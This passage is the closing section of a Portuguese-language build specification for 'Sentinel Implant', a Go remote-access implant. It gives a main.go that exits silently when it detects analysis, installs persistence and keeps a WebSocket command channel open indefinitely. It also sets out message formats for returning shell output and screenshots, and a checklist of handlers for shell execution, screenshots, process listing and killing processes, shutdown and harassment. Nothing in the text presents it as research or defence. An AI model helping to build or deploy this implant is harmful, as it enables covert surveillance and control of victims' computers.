└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 16. Código de Referência

### main.go (Estrutura Completa)

```go
package main

import (
    "log"
    "os"
    "os/signal"
    "syscall"
    
    "sentinel-implant/config"
    "sentinel-implant/core/connection"
    "sentinel-implant/core/identity"
    "sentinel-implant/stealth"
)

func main() {
    // 1. Verificar ambiente
    if !stealth.IsEnvironmentSafe() {
        os.Exit(0) // Sair silenciosamente se detectar análise
    }
    
    // 2. Obter HWID
    hwid := identity.GetHWID()
    
    // 3. Instalar persistência (v1.0: no-op)
    _ = stealth.InstallPersistence()
    
    // 4. Criar cliente WebSocket
    client := connection.NewClient(
        config.Current.ServerURL,
        config.Current.PSK,
        hwid,
    )
    
    // 5. Capturar sinais para graceful shutdown (opcional)
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
    
    go func() {
        <-sigChan
        client.Close()
        os.Exit(0)
    }()
    
    // 6. Rodar loop infinito
    client.RunForever()
}
```

### Resposta a Comandos

Quando o agente executa um comando, ele deve enviar:

**COMMAND_RESULT:**
```json
{
    "type": "COMMAND_RESULT",
    "payload": {
        "command_id": "550e8400-e29b-41d4-a716-446655440000",
        "hwid": "AA-BB-CC-DD-EE-FF",
        "status": "SUCCESS",
        "output": "Windows IP Configuration\n\nHost Name..."
    }
}
```

**Status:** `SUCCESS` ou `ERROR`

### Screenshot Upload

Após capturar screenshot, enviar separadamente:

```json
{
    "type": "SCREENSHOT_UPLOAD",
    "payload": {
        "hwid": "AA-BB-CC-DD-EE-FF",
        "trigger_command_id": "550e8400-e29b-41d4-a716-446655440000",
        "image_base64": "/9j/4AAQSkZJRgABAQEAYABgAAD..."
    }
}
```

---

## Checklist de Implementação

### Core
- [ ] `config/config.go` - Configurações
- [ ] `core/identity/hwid.go` - Geração de HWID
- [ ] `core/connection/websocket.go` - Cliente WebSocket
- [ ] `core/connection/message.go` - Structs de mensagem
- [ ] `core/telemetry/collector.go` - Coleta de métricas

### Handlers
- [ ] `handlers/registry.go` - Registry pattern
- [ ] `handlers/executor/shell.go` - SHELL
- [ ] `handlers/surveillance/screenshot.go` - SCREENSHOT
- [ ] `handlers/surveillance/process.go` - PROCESS_LIST
- [ ] `handlers/troll/message.go` - MESSAGE
- [ ] `handlers/troll/url.go` - OPEN_URL
- [ ] `handlers/troll/system.go` - KILL_PROC, SHUTDOWN

### Stealth
- [ ] `stealth/environment.go` - Placeholders de detecção
- [ ] `stealth/persistence.go` - Placeholders de persistência

### Main
- [ ] `main.go` - Entry point com loop infinito
- [ ] `go.mod` - Dependências

### Build
- [ ] Compilar para Windows x64
- [ ] Testar conexão com backend
- [ ] Testar reconexão automática
- [ ] Testar cada handler

---

## Notas Finais

1. **Não use logs em produção** - Remova todos os `log.Println()` antes de compilar para produção
2. **Teste a reconexão** - Desligue o servidor e veja se o agente tenta reconectar
3. **Teste o HWID** - Execute em máquinas diferentes e confirme que é único
4. **Teste os handlers** - Envie comandos via dashboard e verifique os resultados
5. **Verifique o Base64** - Screenshots devem chegar corretamente no backend

---

*Documento gerado para Sentinel Implant v1.0.6*
*Compatível com Sentinel Core v1.0.6*
